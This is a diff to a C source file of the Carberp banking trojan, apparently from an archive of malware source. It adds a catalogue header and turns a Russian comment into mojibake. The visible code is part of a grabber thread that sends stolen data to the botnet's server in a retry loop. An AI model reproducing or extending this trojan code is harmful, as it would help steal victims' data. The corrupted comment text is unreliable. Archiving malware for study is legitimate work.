@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "GetApi.h"
@@ -70,7 +81,7 @@ DWORD WINAPI GrabberThread( LPVOID lpData )
 			bool Sended = false;
 			do
 			{
-				// Отправляем данные на сервер
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
                 PCHAR ReportURL = GetBotScriptURL(ScriptGrabber);
 				Sended = SendGrabberReport(ReportURL, Buffer, dwSize);
 				if (!Sended)
